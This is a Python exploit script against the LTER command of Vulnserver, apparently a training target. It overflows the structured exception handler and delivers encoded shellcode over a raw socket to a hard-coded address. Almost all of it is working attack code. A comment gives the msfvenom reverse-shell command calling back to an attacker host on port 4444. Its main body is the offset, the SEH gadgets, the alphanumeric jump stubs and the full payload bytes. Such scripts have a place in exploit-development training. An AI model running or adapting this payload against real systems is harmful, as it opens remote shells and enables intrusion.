#!/usr/bin/python
#
# Title: Exploit VULNSERVER - LTER - SEH
# Author: Samir Sanchez Garnica
# Date: 22/10/2019
# Software Link: https://github.com/exploitwritter/VULSERVER-LTER-SEH
# Vendor Homepage: N/A
# Version: N/A
# Tested on: Windows 10 PRO N
# CVE: N/A

import sys
import socket
import random
import string
import struct

def pattern_create(_type,_length):
  _type = _type.split(" ")

  if _type[0] == "trash":
    return _type[1] * _length
  elif _type[0] == "random":
    return ''.join(random.choice(string.lowercase) for i in range(_length))
  elif _type[0] == "pattern":
    _pattern = ''
    _parts = ['A', 'a', '0']
    while len(_pattern) != _length:
      _pattern += _parts[len(_pattern) % 3]
      if len(_pattern) % 3 == 0:
        _parts[2] = chr(ord(_parts[2]) + 1)
        if _parts[2] > '9':
          _parts[2] = '0'
          _parts[1] = chr(ord(_parts[1]) + 1)
          if _parts[1] > 'z':
            _parts[1] = 'a'
            _parts[0] = chr(ord(_parts[0]) + 1)
            if _parts[0] > 'Z':
              _parts[0] = 'A'
    return _pattern
  else:
    return "Not Found"

def pwned(_host, _port, _payload):
	print "[*] Conectandose a {0}:{1}...".format(_host, _port)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((_host, _port))
	print "[*] Conectado, Enviando payload {0} bytes...".format(len(_payload))
	_payload = "{0}\r\n".format(_payload)
	s.send(_payload)
	_data = s.recv(1024)
	s.shutdown
	s.close
	print 'Recibido:', repr(_data)
	print "[+] Payload de {0} bytes Enviado, Satisfactoriamente su payload ejecutado.".format(len(_payload))
 

def main():
  _host = "192.168.5.129"
  _port = 9999
  _offset_eip = 3534
  _break = 4000
  _nseh = struct.pack("<L",0xff774242) #  inc edx, inc edx ja -0x80 \x42\x42\x77\xff el \xff al restarse con 0x7f nos daria 0x80
  _seh =  struct.pack("<L",0x6250160A) #  pop esi # pop ebp # retn essfunc.dll 3 8 one-reg, stack ebp, esi  nonull, ascii

  _prepend_esp = "\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x54\x58\x05\x31\x12\x11\x11\x05\x31\x22\x11\x11\x05\x21\x12\x11\x11\x2D\x33\x33\x33\x33\x50\x5c"

  _jmp_negative = "\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x05\x21\x72\x77\x77\x05\x21\x61\x66\x66\x05\x21\x52\x55\x55\x2D\x33\x33\x33\x33\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x05\x21\x21\x21\x75\x05\x20\x20\x20\x74\x50"
  _prepend_2_esp = "\x54\x58\x66\x2D\xff\x0d\x50\x5C"


  _header = "LTER " + str(".")

  #msfvenom -p windows/shell_reverse_tcp LHOST=192.168.5.137 LPORT=4444 -f python -b '\x00' -e x86/alpha_mixed BufferRegister=ESP -v _shellcode

  _shellcode =  ""
  _shellcode += "\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49"
  _shellcode += "\x49\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a"
  _shellcode += "\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51"
  _shellcode += "\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
  _shellcode += "\x58\x50\x38\x41\x42\x75\x4a\x49\x79\x6c\x6a"
  _shellcode += "\x48\x6d\x52\x43\x30\x67\x70\x37\x70\x61\x70"
  _shellcode += "\x6e\x69\x79\x75\x46\x51\x69\x50\x55\x34\x6e"
  _shellcode += "\x6b\x46\x30\x46\x50\x6e\x6b\x72\x72\x66\x6c"
  _shellcode += "\x6c\x4b\x32\x72\x75\x44\x6e\x6b\x62\x52\x64"
  _shellcode += "\x68\x36\x6f\x4d\x67\x63\x7a\x47\x56\x76\x51"
  _shellcode += "\x59\x6f\x4c\x6c\x75\x6c\x75\x31\x43\x4c\x54"
  _shellcode += "\x42\x44\x6c\x71\x30\x4f\x31\x7a\x6f\x76\x6d"
  _shellcode += "\x77\x71\x38\x47\x6b\x52\x38\x72\x30\x52\x61"
  _shellcode += "\x47\x4e\x6b\x61\x42\x66\x70\x4e\x6b\x53\x7a"
  _shellcode += "\x37\x4c\x4e\x6b\x50\x4c\x52\x31\x34\x38\x4b"
  _shellcode += "\x53\x32\x68\x46\x61\x78\x51\x56\x31\x4e\x6b"
  _shellcode += "\x72\x79\x45\x70\x33\x31\x59\x43\x6e\x6b\x32"
  _shellcode += "\x69\x65\x48\x39\x73\x45\x6a\x37\x39\x6e\x6b"
  _shellcode += "\x47\x44\x6e\x6b\x33\x31\x6a\x76\x66\x51\x69"
  _shellcode += "\x6f\x6e\x4c\x4a\x61\x78\x4f\x34\x4d\x43\x31"
  _shellcode += "\x6b\x77\x46\x58\x6d\x30\x53\x45\x6a\x56\x34"
  _shellcode += "\x43\x73\x4d\x7a\x58\x35\x6b\x33\x4d\x44\x64"
  _shellcode += "\x64\x35\x49\x74\x53\x68\x4e\x6b\x61\x48\x76"
  _shellcode += "\x44\x76\x61\x78\x53\x51\x76\x4e\x6b\x76\x6c"
  _shellcode += "\x32\x6b\x6c\x4b\x52\x78\x65\x4c\x76\x61\x7a"
  _shellcode += "\x73\x4c\x4b\x65\x54\x6c\x4b\x36\x61\x48\x50"
  _shellcode += "\x4d\x59\x32\x64\x74\x64\x37\x54\x51\x4b\x71"
  _shellcode += "\x4b\x50\x61\x63\x69\x71\x4a\x72\x71\x39\x6f"
  _shellcode += "\x39\x70\x51\x4f\x61\x4f\x50\x5a\x6e\x6b\x75"
  _shellcode += "\x42\x6a\x4b\x6c\x4d\x31\x4d\x43\x58\x57\x43"
  _shellcode += "\x55\x62\x65\x50\x65\x50\x31\x78\x71\x67\x30"
  _shellcode += "\x73\x65\x62\x63\x6f\x73\x64\x42\x48\x32\x6c"
  _shellcode += "\x44\x37\x35\x76\x46\x67\x49\x6f\x39\x45\x4d"
  _shellcode += "\x68\x6c\x50\x36\x61\x75\x50\x45\x50\x54\x69"
  _shellcode += "\x6b\x74\x33\x64\x46\x30\x73\x58\x36\x49\x6b"
  _shellcode += "\x30\x62\x4b\x73\x30\x6b\x4f\x5a\x75\x66\x30"
  _shellcode += "\x70\x50\x70\x50\x72\x70\x71\x50\x52\x70\x67"
  _shellcode += "\x30\x50\x50\x61\x78\x78\x6a\x36\x6f\x4b\x6f"
  _shellcode += "\x4d\x30\x59\x6f\x78\x55\x6f\x67\x42\x4a\x76"
  _shellcode += "\x65\x71\x78\x6b\x70\x79\x38\x74\x45\x6e\x69"
  _shellcode += "\x61\x78\x67\x72\x73\x30\x46\x71\x51\x4c\x4d"
  _shellcode += "\x59\x48\x66\x72\x4a\x44\x50\x63\x66\x51\x47"
  _shellcode += "\x75\x38\x5a\x39\x6d\x75\x44\x34\x50\x61\x6b"
  _shellcode += "\x4f\x6e\x35\x6c\x45\x4f\x30\x72\x54\x54\x4c"
  _shellcode += "\x6b\x4f\x42\x6e\x55\x58\x64\x35\x78\x6c\x35"
  _shellcode += "\x38\x5a\x50\x4e\x55\x6e\x42\x76\x36\x79\x6f"
  _shellcode += "\x58\x55\x45\x38\x71\x73\x62\x4d\x72\x44\x55"
  _shellcode += "\x50\x4d\x59\x58\x63\x63\x67\x56\x37\x46\x37"
  _shellcode += "\x35\x61\x6b\x46\x73\x5a\x62\x32\x53\x69\x46"
  _shellcode += "\x36\x78\x62\x59\x6d\x75\x36\x6a\x67\x32\x64"
  _shellcode += "\x56\x44\x75\x6c\x37\x71\x35\x51\x4e\x6d\x43"
  _shellcode += "\x74\x47\x54\x46\x70\x59\x56\x53\x30\x47\x34"
  _shellcode += "\x42\x74\x72\x70\x46\x36\x46\x36\x63\x66\x43"
  _shellcode += "\x76\x33\x66\x62\x6e\x63\x66\x72\x76\x33\x63"
  _shellcode += "\x63\x66\x71\x78\x31\x69\x68\x4c\x47\x4f\x6e"
  _shellcode += "\x66\x79\x6f\x79\x45\x4e\x69\x6d\x30\x62\x6e"
  _shellcode += "\x61\x46\x70\x46\x4b\x4f\x56\x50\x45\x38\x73"
  _shellcode += "\x38\x4f\x77\x57\x6d\x31\x70\x39\x6f\x7a\x75"
  _shellcode += "\x4d\x6b\x6a\x50\x6c\x75\x79\x32\x31\x46\x35"
  _shellcode += "\x38\x6d\x76\x4e\x75\x6d\x6d\x4d\x4d\x4b\x4f"
  _shellcode += "\x4e\x35\x57\x4c\x45\x56\x73\x4c\x37\x7a\x6f"
  _shellcode += "\x70\x69\x6b\x79\x70\x43\x45\x33\x35\x4f\x4b"
  _shellcode += "\x67\x37\x76\x73\x54\x32\x62\x4f\x31\x7a\x77"
  _shellcode += "\x70\x56\x33\x49\x6f\x68\x55\x41\x41"

  _inject = _header
  _inject += "A" * 13
  _inject += _prepend_2_esp
  _inject += "A" * 57
  _inject += _shellcode
  _inject += pattern_create("trash B", _offset_eip-len(_prepend_esp)-48-len(_jmp_negative)-len(_prepend_2_esp)-57-len(_shellcode))
 
  _inject += _prepend_esp
  _inject += _jmp_negative
  _inject += "C" * 35
  _inject += _nseh
  _inject += _seh
  _inject += pattern_create("trash D", _break-len(_inject))

  print(_inject)

  pwned(_host,_port,_inject)

if __name__ == "__main__":
    main()
